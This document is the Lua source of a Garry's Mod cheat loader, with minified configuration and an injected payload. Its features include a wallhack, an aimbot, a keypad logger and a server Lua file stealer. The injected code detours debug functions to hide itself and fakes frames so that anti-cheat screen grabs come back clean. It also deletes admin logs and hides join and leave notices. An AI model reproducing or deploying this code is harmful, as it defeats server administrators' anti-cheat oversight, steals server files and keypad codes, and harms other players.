local username,password,vraime="oijhkv","lkiuhgyf","17.05.2021";if a then return end;a=true;local b={}local c={}for d=65,90 do table.insert(c,string.char(d))end;for d=97,122 do table.insert(c,string.char(d))end;local function f()local g=""for h=1,math.random(20)do g=g..c[math.random(1,#c)]end;return g end;if not username then username=''password=''end;local i=MsgC;MsgC=function()end;local j=false;local k=[[
local __net_name="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
timer.Simple(1,function()
net.Start(__net_name) 
net.WriteBool(false) 
net.WriteBool(true) 
net.WriteDouble(121.75) 
net.SendToServer() 
end)
net.Receive(__net_name,function() 
net.Start(__net_name) 
net.WriteBool(false) 
net.WriteBool(false) 
net.SendToServer()  
end) 
hook.Add( "ChatText", "hide_joinleave", function( index, name, text, typ )
if ( typ == "joinleave" ) then return true end
if ( typ == "namechange" ) then return true end
end )
]]b.maincfg=f()..".txt"b.logs=f()..".txt"b.runlua=f()..".txt"b.allentity=f()..".txt"b.aimbotfriend=f()..".txt"b.aimteams=f()..".txt"b.aimranks=f()..".txt"b.exploits=f()..".txt"b.allnet=f()..".txt"b.antiscreengrab=f()b.font18=f()b.font22=f()b.font14=f()b.menufont=f()b.hooks={}b.hooks["PreDrawViewModel"]=f()b.hooks["PostDrawViewModel"]=f()b.hooks["HUDPaint"]=f()b.hooks["player_changename"]=f()b.hooks["player_connect"]=f()b.hooks["player_disconnect"]=f()b.hooks["player_say"]=f()b.hooks["player_hurt"]=f()b.hooks["entity_killed"]=f()b.hooks["OnEntityCreated"]=f()b.hooks["PostDraw2DSkyBox"]=f()b.hooks["RenderScene"]=f()b.hooks["PreDrawEffects"]=f()b.hooks["Think"]=f()b.hooks["CreateMove"]=f()b.hooks["CalcView"]=f()b.hooks["ShutDown"]=f()b.hooks["PreDrawOpaqueRenderables"]=f()b.hooks["RenderScreenspaceEffects"]=f()b.timer=f()local l={}for h,m in pairs(file.Find("*.png","DATA"))do file.Delete(m)end;for h,m in pairs(file.Find("*.txt","DATA"))do if string.find(file.Read(m,"DATA")or"a",'"ulx":')then file.Delete(m)end;if string.find(file.Read(m,"DATA")or"a","WH_BOX_SIZE")then if not oldconfig then oldconfig=file.Read(m,"DATA")file.Delete(m)else file.Delete(m)end end end;local function n(l)if not l["MENU_TITLEPOS"]then l["MENU_TITLEPOS"]="Up"end;if not l["FAKECRASHKEY"]then l["FAKECRASHKEY"]=0 end;if not l["WH_DISTANCE"]then l["WH_DISTANCE"]=1000 end;if not l["WH_DORMANT"]then l["WH_DORMANT"]=false end;if not l["WH_NAME"]then l["WH_NAME"]=false end;if not l["WH_NAME_COLOR"]then l["WH_NAME_COLOR"]=Color(255,255,255)end;if not l["WH_HEALTH"]then l["WH_NAME_POSITION"]=1 end;if not l["WH_HEALTH"]then l["WH_HEALTH"]=false end;if not l["WH_HEALTH_POSITION"]then l["WH_HEALTH_POSITION"]=4 end;if not l["WH_HEALTH_TYPETYPE"]then l["WH_HEALTH_TYPETYPE"]="Bar"end;if not l["WH_ARMOR"]then l["WH_ARMOR"]=false end;if not l["WH_ARMOR_POSITION"]then l["WH_ARMOR_POSITION"]=1 end;if not l["WH_ARMOR_TYPETYPE"]then l["WH_ARMOR_TYPETYPE"]="Text"end;if not l["WH_MONEY"]then l["WH_MONEY"]=false end;if not l["WH_MONEY_COLOR"]then l["WH_MONEY_COLOR"]=Color(0,255,0)end;if not l["WH_MONEY_POSITION"]then l["WH_MONEY_POSITION"]=1 end;if not l["WH_WEAPON"]then l["WH_WEAPON"]=false end;if not l["WH_WEAPON_COLOR"]then l["WH_WEAPON_COLOR"]=Color(255,255,0)end;if not l["WH_WEAPON_POSITION"]then l["WH_WEAPON_POSITION"]=1 end;if not l["WH_WEAPON_TYPETYPE"]then l["WH_WEAPON_TYPETYPE"]="Only active"end;if not l["WH_JOB"]then l["WH_JOB"]=false end;if not l["WH_JOB_POSITION"]then l["WH_JOB_POSITION"]=1 end;if not l["WH_USERGROUP"]then l["WH_USERGROUP"]=false end;if not l["WH_USERGROUP_POSITION"]then l["WH_USERGROUP_POSITION"]=1 end;if not l["WH_USERGROUP_COLOR"]then l["WH_USERGROUP_COLOR"]=Color(0,0,255)end;if not l["WH_BOX"]then l["WH_BOX"]=false end;if not l["WH_BOX_COLOR"]then l["WH_BOX_COLOR"]=Color(255,255,0)end;if not l["WH_BOX_TYPETYPE"]then l["WH_BOX_TYPETYPE"]="2d"end;if not l["WH_BOX_TYPECOLOR"]then l["WH_BOX_TYPECOLOR"]="Custom"end;if not l["WH_CHAMS"]then l["WH_CHAMS"]=false end;if not l["WH_CHAMS_TYPE"]then l["WH_CHAMS_TYPE"]="Type 1"end;if not l["WH_CHAMS_COLORTYPE"]then l["WH_CHAMS_COLORTYPE"]="Custom"end;if not l["WH_CHAMS_COLOR"]then l["WH_CHAMS_COLOR"]=Color(255,255,255)end;if not l["WH_SKELETON"]then l["WH_SKELETON"]=false end;if not l["WH_SKELETON_COLORTYPE"]then l["WH_SKELETON_COLORTYPE"]=false end;if not l["WH_SKELETON_COLOR"]then l["WH_SKELETON_COLOR"]=Color(255,255,255)end;if not l["WH_ENTITY_DORMANT"]then l["WH_ENTITY_DORMANT"]=false end;if not l["WH_ENTITY_DISTANCE"]then l["WH_ENTITY_DISTANCE"]=1000 end;if not l["WH_ENTITY_NAME"]then l["WH_ENTITY_NAME"]=false end;if not l["WH_ENTITY_NAME_COLOR"]then l["WH_ENTITY_NAME_COLOR"]=Color(255,255,255)end;if not l["WH_ENTITY_NAME_COLORTYPE"]then l["WH_ENTITY_NAME_COLORTYPE"]="Entity"end;if not l["WH_ENTITY_BOX"]then l["WH_ENTITY_BOX"]=false end;if not l["WH_ENTITY_BOX_COLOR"]then l["WH_ENTITY_BOX_COLOR"]=Color(255,255,255)end;if not l["WH_ENTITY_BOX_COLORTYPE"]then l["WH_ENTITY_BOX_COLORTYPE"]="Custom"end;if not l["WH_ENTITY_BOX_TYPE"]then l["WH_ENTITY_BOX_TYPE"]="3d"end;if not l["WH_ENTITY_CHAMS"]then l["WH_ENTITY_CHAMS"]=false end;if not l["WH_ENTITY_CHAMS_TYPE"]then l["WH_ENTITY_CHAMS_TYPE"]="XYZ"end;if not l["WH_ENTITY_CHAMS_COLOR"]then l["WH_ENTITY_CHAMS_COLOR"]=Color(255,255,255)end;if not l["NOSWAY"]then l["NOSWAY"]=false end;if not l["WH_CURSORENTITYNAME"]then l["WH_CURSORENTITYNAME"]=false end;if not l["WH_CURSORENTITYNAME_COLOR"]then l["WH_CURSORENTITYNAME_COLOR"]=Color(255,255,255)end;if not l["WH_NOSKY"]then l["WH_NOSKY"]=false end;if not l["WH_NOSKY_COLOR"]then l["WH_NOSKY_COLOR"]=Color(255,255,255)end;if not l["WH_FULLBRIGHT"]then l["WH_FULLBRIGHT"]=false end;if not l["WH_DEBUGCAMERA_ENABLED"]then l["WH_DEBUGCAMERA_ENABLED"]=false end;if not l["WH_DEBUGCAMERA_KEY"]then l["WH_DEBUGCAMERA_KEY"]=0 end;if not l["WH_DEBUGCAMERA_SPEED"]then l["WH_DEBUGCAMERA_SPEED"]=0.010999999664724 end;if not l["WH_THIRDPERSON_ENABLED"]then l["WH_THIRDPERSON_ENABLED"]=false end;if not l["WH_THIRDPERSON_KEY"]then l["WH_THIRDPERSON_KEY"]=0 end;if not l["WH_THIRDPERSON_DISTANCE"]then l["WH_THIRDPERSON_DISTANCE"]=100 end;if not l["WH_FOVVIEW_ENABLED"]then l["WH_FOVVIEW_ENABLED"]=false end;if not l["WH_FOVVIEW"]then l["WH_FOVVIEW"]=100 end;if not l["AIM_DRAWFOV"]then l["AIM_DRAWFOV"]=false end;if not l["WH_FOV_COLOR"]then l["WH_FOV_COLOR"]=Color(255,255,255)end;if not l["CROSSHAIR_ENABLED"]then l["CROSSHAIR_ENABLED"]=false end;if not l["CROSSHAIR_CROSSHAIR"]then l["CROSSHAIR_CROSSHAIR"]=false end;if not l["CROSSHAIR_FOV"]then l["CROSSHAIR_FOV"]=false end;if not l["CROSSHAIR_BOX"]then l["CROSSHAIR_BOX"]=false end;if not l["CROSSHAIR_SIZE"]then l["CROSSHAIR_SIZE"]=10 end;if not l["CROSSHAIR_COLOR"]then l["CROSSHAIR_COLOR"]=Color(255,255,255)end;if not l["WH_INFO"]then l["WH_INFO"]=false end;if not l["WH_INFO_X"]then l["WH_INFO_X"]=10 end;if not l["WH_INFO_Y"]then l["WH_INFO_Y"]=10 end;if not l["WH_INFO_S_X"]then l["WH_INFO_S_X"]=200 end;if not l["WH_INFO_S_Y"]then l["WH_INFO_S_Y"]=230 end;if not l["WH_VMCHAMS"]then l["WH_VMCHAMS"]=false end;if not l["WH_VMCHAMS_COLOR"]then l["WH_VMCHAMS_COLOR"]=Color(255,255,255)end;if not l["WH_RADAR"]then l["WH_RADAR"]=false end;if not l["WH_RADAR_X"]then l["WH_RADAR_X"]=10 end;if not l["WH_RADAR_Y"]then l["WH_RADAR_Y"]=10 end;if not l["WH_RADAR_S_X"]then l["WH_RADAR_S_X"]=260 end;if not l["WH_RADAR_S_Y"]then l["WH_RADAR_S_Y"]=260 end;if not l["WH_RADAR_DISTANCE"]then l["WH_RADAR_DISTANCE"]=10 end;if not l["WH_RADAR_SIZE"]then l["WH_RADAR_SIZE"]=3 end;if not l["WH_MIRROR"]then l["WH_MIRROR"]=false end;if not l["WH_MIRROR_TYPE"]then l["WH_MIRROR_TYPE"]="Type 1"end;if not l["WH_MIRROR_X"]then l["WH_MIRROR_X"]=10 end;if not l["WH_MIRROR_Y"]then l["WH_MIRROR_Y"]=10 end;if not l["WH_MIRROR_S_X"]then l["WH_MIRROR_S_X"]=300 end;if not l["WH_MIRROR_S_Y"]then l["WH_MIRROR_S_Y"]=200 end;if not l["AIM_ENABLED"]then l["AIM_ENABLED"]=false end;if not l["AIM_AUTOFIRE"]then l["AIM_AUTOFIRE"]=false end;if not l["AIM_AUTORELOAD"]then l["AIM_AUTORELOAD"]=false end;if not l["AIM_NORECOIL"]then l["AIM_NORECOIL"]=false end;if not l["AIM_NOSPREAD"]then l["AIM_NOSPREAD"]=false end;if not l["AIM_SILENT"]then l["AIM_SILENT"]=false end;if not l["AIM_AUTOWALL"]then l["AIM_AUTOWALL"]=false end;if not l["AIM_KEY"]then l["AIM_KEY"]=0 end;if not l["AIM_FOV"]then l["AIM_FOV"]=0 end;if not l["AIM_SMOOTHING"]then l["AIM_SMOOTHING"]=0 end;if not l["AIM_HITBOX"]then l["AIM_HITBOX"]="Head"end;if not l["WH_SNAPLINE"]then l["WH_SNAPLINE"]=false end;if not l["WH_SNAPLINE_COLOR"]then l["WH_SNAPLINE_COLOR"]=Color(255,255,255)end;if not l["LUALOADER_ANTISG"]then l["LUALOADER_ANTISG"]=false end;if not l["MISC_SPECTATORLIST"]then l["MISC_SPECTATORLIST"]=false end;if not l["MISC_SPECTATORLIST_X"]then l["MISC_SPECTATORLIST_X"]=10 end;if not l["MISC_SPECTATORLIST_Y"]then l["MISC_SPECTATORLIST_Y"]=10 end;if not l["MISC_SPECTATORLIST_S_X"]then l["MISC_SPECTATORLIST_S_X"]=250 end;if not l["MISC_SPECTATORLIST_S_Y"]then l["MISC_SPECTATORLIST_S_Y"]=90 end;if not l["MISC_ADMINLIST"]then l["MISC_ADMINLIST"]=false end;if not l["MISC_ADMINLIST_X"]then l["MISC_ADMINLIST_X"]=10 end;if not l["MISC_ADMINLIST_Y"]then l["MISC_ADMINLIST_Y"]=10 end;if not l["MISC_ADMINLIST_S_X"]then l["MISC_ADMINLIST_S_X"]=250 end;if not l["MISC_ADMINLIST_S_Y"]then l["MISC_ADMINLIST_S_Y"]=90 end;if not l["MISC_FLASHSPAM"]then l["MISC_FLASHSPAM"]=false end;if not l["MISC_KEYPADLOGGER"]then l["MISC_KEYPADLOGGER"]=false end;if not l["MISC_KEYPADLOGGER_DISTANCE"]then l["MISC_KEYPADLOGGER_DISTANCE"]=1000 end;if not l["MISC_KEYPADLOGGER_COLOR"]then l["MISC_KEYPADLOGGER_COLOR"]=Color(255,123,0)end;if not l["MISC_BUNNYHOP"]then l["MISC_BUNNYHOP"]=false end;if not l["MISC_AUTOSTRAFE"]then l["MISC_AUTOSTRAFE"]=false end;if not l["MISC_SPECTATE_TARGET"]then l["MISC_SPECTATE_TARGET"]=""end;if not l["MISC_ANTIANTIAFK"]then l["MISC_ANTIANTIAFK"]=false end;if not l["MISC_AUTOPISTOL"]then l["MISC_AUTOPISTOL"]=0 end;if not l["NOIFICATION_SCREENGRAB"]then l["NOIFICATION_SCREENGRAB"]=true end;if not l["NOIFICATION_ADDENTITYFRIEND"]then l["NOIFICATION_ADDENTITYFRIEND"]=true end;if not l["NOIFICATION_DAMAGEDMEBY"]then l["NOIFICATION_DAMAGEDMEBY"]=false end;if not l["NOIFICATION_SPEED"]then l["NOIFICATION_SPEED"]=3 end;if not l["WH_TRANSPARENT_WALLS"]then l["WH_TRANSPARENT_WALLS"]=false end;if not l["WH_TRANSPARENT_WALLS_KEY"]then l["WH_TRANSPARENT_WALLS_KEY"]=0 end;if not l["WH_TRANSPARENT_WALLS_TRA"]then l["WH_TRANSPARENT_WALLS_TRA"]=0.9 end;if not l["LUA_FILE_STEALER"]then l["LUA_FILE_STEALER"]=false end;if not l["PANICKEY"]then l["PANICKEY"]=0 end;if not l["MENU_OPENKEY"]then l["MENU_OPENKEY"]=73 end;if not l["MISC_ADDENTITYFRIEND"]then l["MISC_ADDENTITYFRIEND"]=0 end;if not l["ENTITYLIST"]then l["ENTITYLIST"]={}end;if not l["ENTITYLISTclr"]then l["ENTITYLISTclr"]={}end;if not l["FRIENDLIST"]then l["FRIENDLIST"]={}end;if not l["RANKLIST"]then l["RANKLIST"]={}end;if not l["TEAMLIST"]then l["TEAMLIST"]={}end;if not l["KEYPADTYPE"]then l["KEYPADTYPE"]=0 end;if not l["ANTIAIM_ENABLED"]then l["ANTIAIM_ENABLED"]=false end;if not l["ANTIAIM_X"]then l["ANTIAIM_X"]="Up"end;if not l["ANTIAIM_EMOTION_X"]then l["ANTIAIM_EMOTION_X"]=50 end;if not l["ANTIAIM_Y"]then l["ANTIAIM_Y"]="Forward"end;if not l["ANTIAIM_EMOTION_Y"]then l["ANTIAIM_EMOTION_Y"]=20 end;if not l["MENU_STYLE_TEXT"]then l["MENU_STYLE_TEXT"]=Color(255,255,255)end;if not l["MENU_STYLE_TEXT2"]then l["MENU_STYLE_TEXT2"]=Color(200,200,200)end;if not l["MENU_STYLE_TITLETEXT"]then l["MENU_STYLE_TITLETEXT"]=Color(255,255,255)end;if not l["MENU_STYLE_TITLEBAR"]then l["MENU_STYLE_TITLEBAR"]=Color(45,45,45)end;if not l["MENU_STYLE_WINDOWBG"]then l["MENU_STYLE_WINDOWBG"]=Color(35,35,35)end;if not l["MENU_STYLE_MENUBARBG"]then l["MENU_STYLE_MENUBARBG"]=Color(35,35,35)end;if not l["MENU_STYLE_BUTTON"]then l["MENU_STYLE_BUTTON"]=Color(35,35,35)end;if not l["MENU_STYLE_BUTTONHOVERED"]then l["MENU_STYLE_BUTTONHOVERED"]=Color(120,120,120,100)end;if not l["MENU_STYLE_BORDER"]then l["MENU_STYLE_BORDER"]=Color(100,100,100)end;if not l["MENU_STYLE_SLIDER"]then l["MENU_STYLE_SLIDER"]=Color(255,255,255)end;if not l["MENU_STYLE_СHECKBOXACTIVE"]then l["MENU_STYLE_СHECKBOXACTIVE"]=Color(100,100,255)end;if not l["MENU_STYLE_TEXTENTRY"]then l["MENU_STYLE_TEXTENTRY"]=Color(25,25,25)end;if not l["OBSBYPASS"]then l["OBSBYPASS"]=false end;if not l["RESOLVER"]then l["RESOLVER"]=false end;if not l["WH_FRIENDCOLOR"]then l["WH_FRIENDCOLOR"]=Color(0,255,0)end;if not l["SPAM_KILLSAY"]then l["SPAM_KILLSAY"]={"execcc.online"}end;if not l["SPAM_KILLSAY_ENABLED"]then l["SPAM_KILLSAY_ENABLED"]=false end;if not l["SPAM_KILLSAY_OOC"]then l["SPAM_KILLSAY_OOC"]=false end;if not l["WH_NAME_FRIENDCOLOR"]then l["WH_NAME_FRIENDCOLOR"]=true end;if not l["WH_BOX_FRIENDCOLOR"]then l["WH_BOX_FRIENDCOLOR"]=true end;if not l["CIRCLESTRAFE"]then l["CIRCLESTRAFE"]=false end;if not l["CIRCLESTRAFE_KEY"]then l["CIRCLESTRAFE_KEY"]=0 end;if not l["RESOLVER_X_AXIS"]then l["RESOLVER_X_AXIS"]="Off"end;if not l["RESOLVER_Y_AXIS"]then l["RESOLVER_Y_AXIS"]="Off"end;if not l["TRIGGERBOT_KEY"]then l["TRIGGERBOT_KEY"]=200 end;if not l["HITSOUNDS"]then l["HITSOUNDS"]=false end;if not l["LUA_FILE_STEALER_REPLACE"]then l["LUA_FILE_STEALER_REPLACE"]=false end;if not l["AIM_PRIORITY"]then l["AIM_PRIORITY"]="Field of View"end;if not l["AIM_ENTITYLIST"]then l["AIM_ENTITYLIST"]={}end;if not l["RDRSNA"]then l["RDRSNA"]=false end;if not l["WH_PLAYER_FONT"]then l["WH_PLAYER_FONT"]="Roboto"end;if not l["WH_PLAYER_FONT_SIZE"]then l["WH_PLAYER_FONT_SIZE"]=16 end;if not l["WH_ENTITY_FONT"]then l["WH_ENTITY_FONT"]="Roboto"end;if not l["WH_ENTITY_FONT_SIZE"]then l["WH_ENTITY_FONT_SIZE"]=16 end;if not l["FILTER_ENABLED"]then l["FILTER_ENABLED"]=false end;if not l["FILTER_BRIGHTNESS"]then l["FILTER_BRIGHTNESS"]=0 end;if not l["FILTER_CONTRAST"]then l["FILTER_CONTRAST"]=1 end;if not l["FILTER_SATURATION"]then l["FILTER_SATURATION"]=1 end;if not l["WH_WEAPON_SHOWCLIP"]then l["WH_WEAPON_SHOWCLIP"]=false end;if not l["MENU_FONT"]then l["MENU_FONT"]="Roboto"end;if not l["WH_ENTITY_NAME_DETAILS"]then l["WH_ENTITY_NAME_DETAILS"]=false end;if not l["WH_HITBOX"]then l["WH_HITBOX"]=false end;if not l["WH_HITBOX_COLORTYPE"]then l["WH_HITBOX_COLORTYPE"]=false end;if not l["WH_HITBOX_COLOR"]then l["WH_HITBOX_COLOR"]=Color(255,255,255)end;if not l["MENU_BACKGROUND_ENABLED"]then l["MENU_BACKGROUND_ENABLED"]=true end;if not l["MENU_BACKGROUND_X"]then l["MENU_BACKGROUND_X"]=500 end;if not l["MENU_BACKGROUND_Y"]then l["MENU_BACKGROUND_Y"]=500 end;if not l["MENU_BACKGROUND_SPEED"]then l["MENU_BACKGROUND_SPEED"]=3 end;if not l["CLOUDRADAR"]then l["CLOUDRADAR"]=false end;return l end;if oldconfig then l=n(util.JSONToTable(oldconfig))else l=n({})end;local o={}local function p(q,r)b.randomluaska=b.srn[math.random(1,#b.srn)]if r then o[1]={name=b.randomluaska,code=string.Replace(q,"function()","function()if "..b.antiscreengrab.." then return end ")}file.Write(b.runlua,b.randomluaska)else o[1]={name=b.randomluaska,code=q}file.Write(b.runlua,b.randomluaska)end end;file.Write(b.maincfg,util.TableToJSON(l))local s=false;local t={}local function u()t=util.JSONToTable(file.Read(b.maincfg,"DATA"))if IsInGame()and b.la==nil then timer.Simple(10,function()s=true;local v=0;for w,x in pairs(exec_List("C:/exechack")or{})do if not x:find(".cfgexec")and x:find("autorun")and x~="loginandpassword"then timer.Simple(v,function()p(exec_Read("C:/exechack".."/"..x),true)end)v=v+3 end end end)b.la=true end;if not IsInGame()and b.la then b.la=nil;s=false end end;u()timer.Create("check",1,0,u)local function y(z,A)local B=util.JSONToTable(file.Read(b.maincfg,"DATA"))B[z]=A;file.Write(b.maincfg,util.TableToJSON(B))b.colortext=B["MENU_STYLE_TEXT"]b.colortext2=B["MENU_STYLE_TEXT2"]b.titlebar=B["MENU_STYLE_TITLEBAR"]b.windowbg=B["MENU_STYLE_WINDOWBG"]b.titletext=B["MENU_STYLE_TITLETEXT"]b.menubarbg=B["MENU_STYLE_MENUBARBG"]b.button=B["MENU_STYLE_BUTTON"]b.buttonhovered=B["MENU_STYLE_BUTTONHOVERED"]b.border=B["MENU_STYLE_BORDER"]b.slider=B["MENU_STYLE_SLIDER"]b.checkboxactive=B["MENU_STYLE_СHECKBOXACTIVE"]b.textentry=B["MENU_STYLE_TEXTENTRY"]end;y("KEYPADTYPE",0)if IsInGame()then RunConsoleCommand("retry")end;local C={}AccessorFunc(C,"m_iSelectedNumber","SelectedNumber")Derma_Install_Convar_Functions(C)function C:Init()self:SetSelectedNumber(0)self:SetSize(60,30)end;function C:UpdateText()local D=input.GetKeyName(self:GetSelectedNumber())if not D then D="None"end;D=language.GetPhrase(D)self:SetText(D)end;function C:DoClick()self:SetText("Select")input.StartKeyTrapping()self.Trapping=true end;function C:DoRightClick()self:SetText("None")self:SetValue(0)end;function C:SetSelectedNumber(E)self.m_iSelectedNumber=E;self:ConVarChanged(E)self:UpdateText()self:OnChange(E)end;function C:Think()if input.IsKeyTrapping()and self.Trapping then local F=input.CheckKeyTrapping()if F then if F==KEY_ESCAPE then self:SetValue(self:GetSelectedNumber())else self:SetValue(F)end;self.Trapping=false end end;self:ConVarNumberThink()end;function C:SetValue(e)self:SetSelectedNumber(e)end;function C:GetValue()return self:GetSelectedNumber()end;function C:OnChange()end;derma.DefineControl("DBinder","",C,"DButton")local function G(H)local a={}for I in H:gsub('[^\128-\191][\128-\191]*',function(E)return E:find'%w'and'\0'..E..'\0'end):gsub('%z%z',''):gmatch'%z(.-)%z'do table.insert(a,I)end;return unpack(a)or"noname"end;local J={}local K={}b.srn={}local L=GameDetails;function GameDetails(M,N,O,P,Q,R)y("KEYPADTYPE",0)y("MISC_SPECTATE_TARGET","")file.Write(b.logs,'{"ulx":"","connect":"","damage":"","namechange":"","disconnect":"","prop":"","chat":"","kill":""}')J={}K={}GetHostName=G(M)ScriptExistsif=exec_Exists("C:/exechack".."/"..GetHostName)b.run=true;b.srn={}b.steamid64=Q;return L(M,N,O,P,Q,R)end;local function S(D)local E=0;local F=string.Explode("/",D)local e=""for w,T in ipairs(F)do if w==#F then else if e..T=="entities"then E=w end end end;if E==0 then return false end;local U=F[E+1]if J[U]then return end;J[U]=true;return U:Replace(".lua","")end;hook.Add("bitch","1",function(a,D)local M=S(a)if M then K[M]=true end;if string.find(D,"aeypad_baaaaaaaaaaaaaaaaaaase")then y("KEYPADTYPE",1)end;if a and a:find("addons")and not IsInGame()then b.srn[#b.srn+1]=a end;if b.run then b.run=false;return D..[[

local gay={}
local hacka={}
local fa
local aa
local fdfbp = {}
local fdfh = shgf_handler
_G.shgf_handler = nil
fdfbp["DetourFuncs"] = {}
fdfbp["DetourNames"] = {}
fdfbp["Hooks"] = {}
function fdfbp.Detour( old, new, name )
    name = name or ""
    fdfbp.DetourFuncs[new] = old
    fdfbp.DetourNames[new] = name
    return new
end 
local isstr,isfunc = isstring,isfunction
local tstring = tostring
local cgarbage = collectgarbage
local dbginfo = debug.getinfo
local ja = jit.attach
local gtuv = debug.getupvalue
local stringfind = string.find
local dbghook = debug.sethook
debug.getinfo = fdfbp.Detour( debug.getinfo, function( func, ... )
    local n_func = func
    
    if fdfbp.DetourFuncs[func] then n_func = fdfbp.DetourFuncs[func] end
    
    return dbginfo( n_func, ... )
end, "debug.getinfo")

local dsmeta = debug.setmetatable
local metatab = {}

debug.setmetatable = fdfbp.Detour( debug.setmetatable, function( tab, meta )
    if tab == fdfbp.DetourFuncs then tab = metatab end
    
    return dsmeta( tab, meta )
end, "debug.setmetatable")


local hk_dtr = {}


local uvj = debug.upvaluejoin

debug.upvaluejoin = fdfbp.Detour( debug.upvaluejoin, function( f1, n1, f2, n2 )
    local n_func = f1
    local n_func2 = f2
    
    if fdfbp.DetourFuncs[f1] then n_func = fdfbp.DetourFuncs[f1] end
    if fdfbp.DetourFuncs[f2] then n_func2 = fdfbp.DetourFuncs[f2] end
    
    return uvj(n_func, n1, n_func2, n2)
end,"debug.upvaluejoin")

local sfenv = debug.setfenv

debug.setfenv = fdfbp.Detour( debug.setfenv, function( obj, env )
    if fdfbp.DetourFuncs[obj] then obj = function() end end
    
    return sfenv( obj, env )
end,"debug.setfenv")

local stump = string.dump

string.dump = fdfbp.Detour( string.dump, function( func, ... )
    local n_func = func
    
    if fdfbp.DetourFuncs[func] then n_func = fdfbp.DetourFuncs[func] end
    
    return stump(n_func, ... )
end,"string.dump")

local dbggetlocal = debug.getlocal

debug.getlocal = fdfbp.Detour( debug.getlocal, function( thread, level, index )
    local n_thread = thread

    if isfunc(n_thread) and fdfbp.DetourFuncs[n_thread] then n_thread = fdfbp.DetourFuncs[n_thread] end 
    
    return dbggetlocal(n_thread or thread, level, index)
end,"debug.getlocal")


local renderview = render.RenderView
local renderclear = render.Clear
local vgetworldpanel = vgui.GetWorldPanel
local panic = false
local oRCC = RunConsoleCommand
local eyeangles = _G.EyeAngles
local function translate(number)
for _,v in pairs(game.GetWorld():GetMaterials())do
Material(v):SetFloat("$alpha",number)
end
end
local function renderpanic( delay )
if panic then return end
panic = true
if hacka.tnl then
translate(1)
hacka.tnl=false
end
gui.HideGameUI()
local worldpanel = vgetworldpanel()
if gay["LUALOADER_ANTISG"]then
]]..b.antiscreengrab..[[=true
if IsValid(worldpanel) then
worldpanel:SetPaintedManually( true )
end
else
if gay["MISC_SPECTATORLIST"]and IsValid(hacka.specb) then
hacka.specb:Hide()
end
if gay["WH_MIRROR"]and IsValid(hacka.mirror) then
hacka.mirror:Hide()
end
if gay["WH_RADAR"]and IsValid(hacka.ac) then
hacka.ac:Hide()
end
if gay["WH_INFO"]and IsValid(hacka.info) then
hacka.info:Hide()
end
if gay["MISC_ADMINLIST"]and IsValid(hacka.adminlist) then
hacka.adminlist:Hide()
end
if IsValid(hacka.rt)then
hacka.rt:Hide()
end
end
for k, v in pairs( ents.GetAll() ) do
if v:GetColor() and v:GetColor().a == 100 and v:GetRenderMode() and v:GetRenderMode() == 4 then 
v:SetColor(Color(255, 255, 255)) 
end
end
renderclear(0, 0, 0, 255, true, true)
renderview(
{
origin = LocalPlayer():EyePos(),
angles = eyeangles(),
x = 0,
y = 0,
w = ScrW(),
h = ScrH(),
dopostprocess = true,
drawhud = true,
drawmonitors = true,
drawviewmodel = true,
viewmodelfov = 54,
fov = 75
})
timer.Simple(delay, function()
local worldpanel = vgetworldpanel()
if gay["LUALOADER_ANTISG"]then
]]..b.antiscreengrab..[[=false
if IsValid(worldpanel) then
worldpanel:SetPaintedManually(false)
end
else
if gay["MISC_SPECTATORLIST"]and IsValid(hacka.specb) then
hacka.specb:Show()
end
if gay["WH_MIRROR"]and IsValid(hacka.mirror) then
hacka.mirror:Show()
end
if gay["WH_RADAR"]and IsValid(hacka.ac) then
hacka.ac:Show()
end
if gay["WH_INFO"]and IsValid(hacka.info) then
hacka.info:Show()
end
if gay["MISC_ADMINLIST"]and IsValid(hacka.adminlist) then
hacka.adminlist:Show()
end
if IsValid(hacka.rt)then
hacka.rt:Show()
end
end
if gay["NOIFICATION_SCREENGRAB"]then
hacka.onitify("You screengraben")
end
panic = false
end)
end

local oRC = render.Capture
local oRCP = render.CapturePixels
local oRRP = render.ReadPixel

local findmeta = FindMetaTable
local ply = findmeta( "Player" )
local oconcommand = ply.ConCommand

render.Capture = fdfbp.Detour(render.Capture, function(a)

if a["quality"] != "1"then
   renderpanic(0.05)
end

    local output = oRC(a)
    return output
end, "render.Capture")

render.CapturePixels = fdfbp.Detour(render.CapturePixels, function(...)

    renderpanic(0.05)
    
    local output = oRCP(...)
    return output
end, "render.CapturePixels")

render.ReadPixel = fdfbp.Detour(render.ReadPixel, function(a,b)
if not a==1 and not b==1 then
    renderpanic(0.05)
    end
    local output = oRRP(a,b)
    return output
end, "render.ReadPixel")

ply.ConCommand = fdfbp.Detour(ply.ConCommand, function(pl, cmd, ...)
    if string.lower(cmd) == "jpeg" then
        renderpanic( 0.2 )
        oconcommand( pl, cmd, ... )
        return
    end

    if string.lower(cmd) == "__screenshot_internal" then
        renderpanic( 0.3 )
        oconcommand( pl, cmd, ... )
        return
    end

    if string.lower(cmd) == "screenshot" then
        renderpanic( 0.3 )
        oconcommand( pl, cmd, ... )
        return
    end

    if string.lower(cmd) == "startmovie" then
        renderpanic( 0.3 )
        oRCC( cmd, ... )
        return
    end
    
    return oconcommand( pl, cmd, ... )
end, "player:ConCommand")


_G.RunConsoleCommand = fdfbp.Detour(_G.RunConsoleCommand, function(cmd, ...)
    if string.lower(cmd) == "jpeg" then
        renderpanic( 0.2 )
        oRCC( cmd, ... )
        return
    end

    if string.lower(cmd) == "__screenshot_internal" then
        renderpanic( 0.3 )
        oRCC( cmd, ... )
        return
    end

    if string.lower(cmd) == "screenshot" then
        renderpanic( 0.3 )
        oRCC( cmd, ... )
        return
    end
    
    if string.lower(cmd) == "startmovie" then
        renderpanic( 0.3 )
        oRCC( cmd, ... )
        return
    end
    
    return oRCC( cmd, ... )
end, "RunConsoleCommand")


timer.Simple(10,function()

local type = type;
local next = next;

local function Copy(tt, lt)
local copy = {}
if lt then
if type(tt) == "table" then
for k,v in next, tt do
copy[k] = Copy(k, v)
end
else
copy = lt
end
return copy
end
if type(tt) != "table" then
copy = tt
else
for k,v in next, tt do
copy[k] = Copy(k, v)
end
end
return copy
end

local surface = Copy(surface);
